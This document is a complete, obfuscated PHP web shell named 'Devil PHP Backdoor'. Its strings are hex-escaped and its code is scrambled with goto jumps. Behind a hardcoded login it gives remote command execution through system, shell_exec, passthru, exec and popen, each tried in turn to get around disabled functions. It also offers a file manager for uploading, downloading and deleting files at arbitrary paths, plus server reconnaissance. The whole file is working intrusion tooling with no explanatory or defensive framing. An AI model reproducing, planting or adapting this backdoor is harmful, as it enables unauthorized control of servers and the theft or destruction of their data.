<?php
 goto JkAp3; ss8Yr: function showDownloadLink($file) { $dir = getcwd(); if (isset($_GET["\143\150\104\151\162"])) { $dir = $_GET["\143\150\x44\x69\x72"]; } echo "\74\x61\40\150\x72\x65\x66\x3d\42\x3f\141\143\x74\151\x6f\x6e\75\146\x69\154\145\163\x26\143\150\x44\151\162\75" . $dir . "\46\144\x6f\167\156\154\157\x61\144\x3d" . $file . "\42\57\76\133\x44\x6f\167\x6e\154\157\141\144\135\74\57\141\76"; } goto BE4IO; w9cXK: function getFileMime($file) { return mime_content_type($file); } goto AtRPe; BsPcD: if (isset($_POST["\x6c\x6f\x67\151\156"]) && isset($_POST["\x70\141\x73\163"])) { if ($_POST["\x6c\157\147\x69\156"] == "\x4e\x6f\x6d\x61\156\120\x72\x6f\144\150\x61\156" && $_POST["\x70\141\163\163"] == "\x42\x44\x53\x45\x43\x7b\x5f\x64\x33\x56\x31\x4c\x5f\x50\x48\x50\x5f\x62\x34\x43\x4b\x44\x30\x30\x72\x5f\x7d") { $_SESSION["\x6c\x6f\x67\151\x6e"] = "\x6c\x6f\x67\147\145\144"; } } goto p67iP; JkAp3: ob_start(); goto BISgL; BISgL: session_start(); goto BsPcD; tQtbl: if (isset($_GET["\144\157\167\x6e\154\157\x61\x64"]) && !empty($_GET["\144\157\167\x6e\x6c\157\x61\x64"]) && isset($_GET["\x63\150\x44\151\x72"])) { downloadFile($_GET["\143\150\x44\x69\162"] . "\x2f" . $_GET["\x64\157\x77\156\154\157\141\144"]); } goto AjwiS; hoS3m: if (isset($_POST["\x66\x6f\x6c\144\x65\162\x4e\x61\x6d\x65"]) && !empty($_POST["\x66\157\154\x64\x65\162\x4e\x61\155\x65"])) { $dir = getcwd(); if (isset($_GET["\x63\150\x44\151\162"]) && !empty($_GET["\143\x68\x44\151\162"])) { $dir = $_GET["\x63\150\104\151\162"]; } $createFolderFlag = createFolder($dir, $_POST["\x66\157\154\x64\145\x72\x4e\x61\155\145"]); } goto tQxiS; iOdeB: function createFolder($path, $name) { if (is_dir($path . "\57" . $name)) { return "\106\x6f\154\144\x65\x72\x20\x61\x6c\162\145\x61\144\171\x20\x65\x78\x69\x73\x74\56"; } else { if (!is_writable($path)) { return "\x44\x6f\x6e\47\164\x20\150\x61\x76\x65\x20\x77\x72\151\x74\x65\40\160\x65\162\155\x69\163\163\x69\157\156\x2e"; } else { try { mkdir($path . "\x2f" . $name, 511); return "\106\157\154\x64\x65\x72\x20\x68\x61\163\x20\x62\145\x65\x6e\x20\143\162\x65\141\164\145\144\x2e"; } catch (Exception $e) { return "\x65\162\162\x6f\x72\56"; } } } } goto nGUMD; nGUMD: function uploadFile($path, $file) { $targetFile = $path . "\x2f" . basename($file["\165\x70\x6c\157\141\144\x46\x69\154\145"]["\156\141\x6d\145"]); if (!is_writable($path)) { return "\104\x6f\156\47\164\x20\x68\141\x76\x65\x20\x77\x72\x69\164\x65\40\x70\x65\162\x6d\x69\163\x73\151\157\156\56"; } else { if (move_uploaded_file($file["\x75\160\154\157\x61\144\106\x69\154\x65"]["\x74\155\x70\137\x6e\141\x6d\x65"], $targetFile)) { return "\x46\151\154\145\40\x68\141\163\40\x62\145\145\156\x20\165\160\154\157\141\x64\x65\144\x2e"; } else { return "\103\157\165\154\x64\156\47\164\x20\165\160\x6c\x6f\x61\x64\40\146\x69\154\x65\56"; } } } goto w9cXK; xMIJW: function createFile($path, $name) { if (file_exists($path . "\57" . $name)) { echo "\106\151\154\x65\40\141\154\x72\145\141\x64\x79\x20\145\x78\151\163\x74\56"; } else { if (!is_writable($path)) { echo "\x44\x6f\156\47\164\x20\150\141\166\145\x20\167\x72\x69\164\x65\x20\x70\145\162\x6d\151\x73\163\151\x6f\156\56"; } else { try { $file = fopen($path . "\57" . $name, "\x77"); fwrite($file, "\164\145\x73\x74"); fclose($file); return "\106\x69\154\x65\x20\x68\x61\163\40\142\145\x65\156\x20\x63\162\145\141\x74\x65\144\56"; } catch (Exception $e) { return "\x65\162\162\157\162\x2e"; } } } } goto iOdeB; AjwiS: if (isset($_GET["\144\145\x6c\145\x74\145"]) && !empty($_GET["\144\145\154\x65\164\x65"]) && isset($_GET["\143\x68\104\151\x72"])) { if (unlink($_GET["\143\x68\x44\x69\x72"] . "\x2f" . $_GET["\x64\x65\154\x65\x74\x65"])) { $deleteFileFlag = "\x46\151\x6c\x65\40\x68\141\163\x20\x62\x65\145\156\x20\x64\x65\x6c\x65\164\x65\144\x2e"; } else { $deleteFileFlag = "\x43\157\x75\154\144\156\x27\164\40\x64\145\x6c\145\164\145\x20\x74\150\x65\40\x66\151\x6c\145\x2e"; } } goto K5ZdW; bd2b3: ?>
<!doctypehtml><html><head><title>Devil PHP Backdoor</title><style>::-webkit-scrollbar{width:10px}::-webkit-scrollbar-track{box-shadow:inset 0 0 5px grey;border-radius:5px}::-webkit-scrollbar-thumb{background:#24484a;border-radius:5px}::-webkit-scrollbar-thumb:hover{background:#0bdbca}*{margin:0;padding:0}body{background:#000;color:#0bdbca;max-width:1024px;margin:auto;font-family:'Courier New',Courier,monospace}.center{margin:0;position:absolute;top:50%;left:50%;-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}input{width:auto;border:#0bdbca 2px solid;background:#000;color:#0bdbca;height:30px;width:200px;padding:10px;font-size:18px;font-family:'Courier New',Courier,monospace;outline:0}input:focus{border:#0bdbca 2px solid;background:#000;color:#0bdbca}button{background:#0bdbca;color:#000;outline:0;padding:10px;font-family:'Courier New',Courier,monospace;border:#0bdbca 2px solid;height:55px}.simple-nav{background:#000;border:#0bdbca 2px solid;height:40px;width:100%}.simple-nav-item{text-decoration:none;height:40px;border:#000 1px solid;background:#0bdbca;color:#000;padding:10px}.table-1{margin-top:20px;border:#0bdbca 2px solid;width:100%;max-width:1920px}td{padding:5px}pre{height:500px;width:1000px;text-align:left;overflow:scroll;font-size:13px}.main-wrapper{display:flex;align-items:center;justify-content:center;min-height:100vh;height:auto;padding:20px}.link-1{text-decoration:none;color:#0bdbca}.link-2{text-decoration:none;color:#fff}.fileManContent{width:994px;height:500px;overflow:scroll;margin:0;padding:0}.fileManContent thead th{position:sticky;top:0}a{text-decoration:none;color:#09947d}</style></head><body><div><?php  goto x23Fx; K5ZdW: if (isset($_POST["\146\151\154\x65\x4e\141\155\x65"]) && !empty($_POST["\x66\x69\154\145\x4e\x61\155\145"])) { $dir = getcwd(); if (isset($_GET["\x63\150\x44\x69\x72"]) && !empty($_GET["\x63\150\x44\x69\162"])) { $dir = $_GET["\x63\150\104\x69\162"]; } $createFileFlag = createFile($dir, $_POST["\x66\x69\x6c\x65\x4e\x61\x6d\145"]); } goto hoS3m; x23Fx: if (!isset($_SESSION["\154\157\x67\x69\156"])) { ?>
<div class="center"><h1>Login to Devil PHP Backdoor</h1><br><form action="<?php  echo $_SERVER["\x50\x48\120\x5f\x53\x45\x4c\106"]; ?>
"method="POST"><input name="login"placeholder="Login"> <input name="pass"placeholder="Pssword"type="password"> <button type="submit">Login</button></form><br><hr><br><?php  echo "\74\150\x32\x3e\x53\x65\162\x76\145\162\40\x49\120\40\72\x20" . $_SERVER["\x53\x45\x52\126\105\122\x5f\x41\x44\x44\122"] . "\74\x2f\150\x32\76"; ?>
<br><hr></div><?php  } else { ?>
<h1 style="margin-top:20px">Devil PHP Backdoor</h1><table style="margin-top:20px"><tr><td><a class="simple-nav-item"href="?action=system">System Info</a></td><td><a class="simple-nav-item"href="?action=files">File Manager</a></td><td><a class="simple-nav-item"href="?action=terminal">Terminal</a></td><td><a class="simple-nav-item"href="?action=logout">Logout</a></td></tr></table><br><h2>SERVER IP<?php  echo $_SERVER["\x53\105\x52\x56\x45\122\137\101\104\104\x52"]; ?>
</h2><?php  echo posix_getpwuid(posix_geteuid())["\x6e\x61\x6d\145"]; echo "\100"; echo gethostname(); echo "\74\x62\162\x3e" . getcwd(); ?>
<br><br><hr><br><?php  if (isset($_GET["\141\x63\164\x69\x6f\156"])) { if ($_GET["\141\143\x74\x69\x6f\x6e"] == "\x66\151\x6c\145\163") { if (isset($_GET["\143\x68\x44\151\x72"]) && !empty($_GET["\x63\x68\x44\x69\162"])) { if (is_dir($_GET["\x63\x68\104\x69\x72"])) { if (is_readable($_GET["\143\x68\104\151\162"])) { chdir(strval($_GET["\143\150\104\x69\x72"])); } else { echo "\x44\x6f\x6e\x27\x74\40\x68\141\x76\145\40\x72\145\141\x64\x20\160\x65\x72\x6d\x69\163\x73\151\x6f\x6e\56"; } } else { echo "\x49\164\47\163\x20\x6e\157\164\40\141\40\144\x69\162\145\x63\164\157\x72\x79\x2e"; } } ?>
<form action=""><input name="chDir"placeholder="Change working directory [Current :<?php  echo getcwd(); ?>
]"style="width:900px"> <input name="action"type="hidden"value="files"> <button type="submit">Change</button></form><?php  if (isset($deleteFileFlag)) { echo $deleteFileFlag; } ?>
<table class="table-1"style="width:1024px;height:500px;margin-bottom:25px"><tr><td style="width:1000px;height:500px"><div class="fileManContent"><table style="width:100%"><thead style="background:#0bdbca;color:#000"><td>#</td><td>Name</td><td>Size</td><td>Perm</td></thead><tbody><?php  $dirList = scandir(getcwd()); $counter = 1; foreach ($dirList as $dirContent) { echo "\74\164\162\x20\x73\x74\x79\x6c\x65\x3d\x27\142\x61\x63\x6b\x67\162\157\x75\x6e\x64\72\x20\43\64\62\x34\x35\x34\63\x3b\40\x63\157\154\157\x72\72\40\43\x66\146\146\x66\x66\x66\x27\76"; echo "\74\x74\144\x3e"; echo $counter; $counter++; echo "\x3c\x2f\x74\144\x3e"; echo "\x3c\x74\144\x3e"; if (is_dir($dirContent)) { echo "\74\x61\40\x63\154\141\163\163\x3d\42\x6c\x69\156\x6b\x2d\x31\42\40\150\162\145\146\75\x27\x3f\x61\x63\164\x69\x6f\156\x3d\146\151\x6c\145\163\x26\143\150\x44\151\162\x3d" . getcwd() . "\57" . $dirContent . "\x27\76" . $dirContent . "\x3c\x61\x2f\x3e\74\142\162\76"; } else { echo $dirContent; echo showDownloadLink($dirContent); echo showDeleteLink($dirContent); } echo "\x3c\57\x74\144\x3e"; echo "\x3c\164\144\x3e"; try { if (!is_dir($dirContent)) { $size = filesize($dirContent); if ($size > 1000) { $size /= 1000; if ($size > 1000) { $size /= 1000; echo round($size) . "\40\x6d\x62"; } else { echo round($size) . "\40\x6b\x62"; } } else { echo $size . "\x20\x62\171\x74\x65\163"; } } else { echo "\x2d\55"; } } catch (Exception $e) { } echo "\x3c\57\x74\x64\76"; echo "\74\164\x64\76"; try { echo filePrmissions($dirContent); } catch (Exception $e) { } echo "\74\x2f\164\144\76"; echo "\74\x2f\x74\162\76"; } ?>
</tbody></table></div></td><td></td></tr></table><table class="table-1"><td><?php  if (isset($createFolderFlag)) { echo $createFolderFlag; } ?>
<form action=""method="POST"><input name="folderName"placeholder="Folder Name"style="width:320px"> <button type="submit">Create Folder</button></form></td><td><?php  if (isset($createFileFlag)) { echo $createFileFlag; } ?>
<form action=""method="POST"><input name="fileName"placeholder="File Name"stype="text"tyle="width: 320px;"> <button type="submit">Create File</button></form></td><tr><td><?php  if (isset($uploadFileFlag)) { echo $uploadFileFlag; } ?>
<form action=""method="POST"enctype="multipart/form-data"><input name="uploadFile"placeholder="Select file"style="width:320px"type="file"> <button type="submit">Upload</button></form></td></tr></table><br><?php  } elseif ($_GET["\141\x63\x74\x69\157\156"] == "\x6c\x6f\x67\157\165\x74") { unset($_SESSION["\x6c\157\x67\x69\x6e"]); session_destroy(); header("\122\145\146\162\x65\x73\150\72\60"); } elseif ($_GET["\x61\143\x74\x69\x6f\x6e"] == "\164\145\x72\155\151\x6e\x61\x6c") { ?>
<form action=""method="POST"><input name="command"placeholder="Command"style="width:900px"> <button type="submit">Execute</button></form><table class="table-1"style="width:1024;height:500px"><tr><td><pre><?php  if (isset($_POST["\143\x6f\x6d\155\141\x6e\144"]) && !empty($_POST["\x63\x6f\155\155\x61\x6e\144"])) { if (!checkFunctions("\163\171\x73\164\x65\x6d\x73")) { system(strval($_POST["\143\x6f\155\x6d\x61\x6e\x64"]), $SystemResult); } elseif (!checkFunctions("\163\150\x65\154\x6c\x5f\x65\170\145\143\x73")) { echo shell_exec(strval($_POST["\143\x6f\x6d\x6d\x61\156\x64"])); } elseif (!checkFunctions("\x70\x61\x73\163\164\150\162\165")) { echo passthru(strval($_POST["\143\x6f\x6d\155\141\x6e\x64"])); } elseif (!checkFunctions("\145\x78\x65\143")) { exec(strval($_POST["\x63\157\155\155\141\156\144"]), $ExecResult, $retval); foreach ($ExecResult as $output) { echo $output . "\74\142\162\x3e"; } } elseif (!checkFunctions("\160\157\160\x65\x6e")) { $handle = popen(strval($_POST["\143\157\155\x6d\141\x6e\x64"]) . "\40\62\76\x26\x31", "\x72"); $read = fread($handle, 2096); echo $read; fclose($handle); } else { echo "\74\150\61\76\x53\157\x72\162\x79\54\40\143\x61\x6e\47\164\40\x65\170\x65\143\165\x74\x65\40\143\157\x6d\155\141\x6e\x64\x20\41\74\x2f\150\x31\x3e"; } } ?>
</pre></td></tr></table><?php  } else { ?>
<table class="table-1"><tr><td>Operating System</td><td><?php  echo php_uname("\x73"); ?>
</td></tr><tr><td>Release Name</td><td><?php  echo php_uname("\x72"); ?>
</td></tr><tr><td>Version Information</td><td><?php  echo php_uname("\x76"); ?>
</td></tr><tr><td>Host Name</td><td><?php  echo php_uname("\x6e"); ?>
</td></tr><tr><td>Machine Type</td><td><?php  echo php_uname("\x6d"); ?>
</td></tr><tr><td>PHP Version</td><td><?php  echo phpversion(); ?>
</td></tr><tr><td>PHP Interface</td><td><?php  echo php_sapi_name(); ?>
</td></tr><tr><td>Server IP</td><td><?php  echo $_SERVER["\123\105\122\x56\x45\x52\137\101\x44\104\122"]; ?>
</td></tr><tr><td>User</td><td><?php  echo posix_getpwuid(posix_geteuid())["\x6e\141\x6d\x65"]; ?>
</td></tr><tr><td>Disabled PHP Functions</td><td><?php  echo ini_get("\x64\x69\163\141\142\154\x65\137\x66\x75\x6e\x63\164\151\x6f\156\163"); ?>
</td></tr></table><?php  } } else { ?>
<h1>Welcome to Devil PHP Backdoor</h1><?php  } } goto LCcPV; SwucF: function filePrmissions($file) { $perms = fileperms($file); switch ($perms & 61440) { case 49152: $info = "\x73"; break; case 40960: $info = "\x6c"; break; case 32768: $info = "\x2d"; break; case 24576: $info = "\x62"; break; case 16384: $info = "\144"; break; case 8192: $info = "\143"; break; case 4096: $info = "\160"; break; default: $info = "\165"; } $info .= $perms & 256 ? "\x72" : "\55"; $info .= $perms & 128 ? "\167" : "\55"; $info .= $perms & 64 ? $perms & 2048 ? "\x73" : "\170" : ($perms & 2048 ? "\x53" : "\55"); $info .= $perms & 32 ? "\162" : "\55"; $info .= $perms & 16 ? "\x77" : "\55"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\x78" : ($perms & 1024 ? "\x53" : "\55"); $info .= $perms & 4 ? "\x72" : "\55"; $info .= $perms & 2 ? "\167" : "\x2d"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\x78" : ($perms & 512 ? "\124" : "\x2d"); return $info; } goto tQtbl; tQxiS: if (isset($_FILES["\165\x70\154\157\x61\144\106\151\x6c\145"]) && !empty($_FILES["\165\160\154\157\x61\x64\x46\x69\154\145"]["\156\141\x6d\145"])) { $dir = getcwd(); if (isset($_GET["\x63\x68\104\x69\x72"]) && !empty($_GET["\143\x68\104\151\x72"])) { $dir = $_GET["\x63\x68\x44\x69\162"]; } $uploadFileFlag = uploadFile($dir, $_FILES); } goto bd2b3; AtRPe: function downloadFile($file) { if (file_exists($file)) { try { header("\103\x6f\156\164\x65\x6e\164\55\104\145\163\x63\162\x69\x70\x74\x69\157\x6e\72\x20\106\x69\154\145\40\x54\162\141\156\x73\146\x65\x72"); header("\x43\157\156\x74\x65\156\164\x2d\x54\171\x70\145\x3a\40\x61\x70\x70\x6c\151\x63\141\x74\151\x6f\x6e\x2f\x6f\143\x74\145\x74\x2d\x73\164\x72\145\141\x6d"); header("\x43\x6f\x6e\x74\x65\156\164\55\104\151\163\x70\x6f\x73\151\164\x69\x6f\x6e\x3a\x20\141\x74\x74\141\x63\150\155\145\156\x74\73\x20\146\151\154\145\x6e\141\155\145\x3d\42" . basename($file) . "\42"); header("\105\170\160\x69\x72\x65\x73\72\40\x30"); header("\103\141\x63\150\145\x2d\103\157\156\x74\x72\157\x6c\72\x20\x6d\165\163\164\55\x72\x65\x76\x61\154\x69\x64\x61\x74\145"); header("\x50\x72\141\x67\x6d\x61\x3a\40\x70\x75\142\x6c\151\143"); header("\103\x6f\156\x74\145\x6e\x74\55\x4c\x65\156\147\x74\x68\72\40" . filesize($file)); readfile($file); die; } catch (Exception $e) { } } } goto ss8Yr; p67iP: function checkFunctions($param) { $disabled_functions = explode("\x2c", ini_get("\x64\151\x73\x61\x62\x6c\145\137\146\165\x6e\x63\164\151\157\156\163")); return in_array($param, $disabled_functions); } goto xMIJW; BE4IO: function showDeleteLink($file) { $dir = getcwd(); if (isset($_GET["\143\150\x44\x69\162"])) { $dir = $_GET["\143\x68\x44\151\162"]; } echo "\x3c\141\40\x68\162\x65\x66\x3d\x22\x3f\141\x63\x74\151\x6f\x6e\x3d\x66\x69\154\145\x73\x26\143\150\104\x69\162\75" . $dir . "\46\144\145\154\145\164\x65\x3d" . $file . "\x22\40\x73\x74\171\x6c\x65\75\x22\x63\157\154\x6f\162\x3a\x20\x72\145\x64\73\42\57\x3e\133\104\145\x6c\x65\164\x65\135\x3c\x2f\141\x3e"; } goto SwucF; LCcPV: ?>
</div></body></html>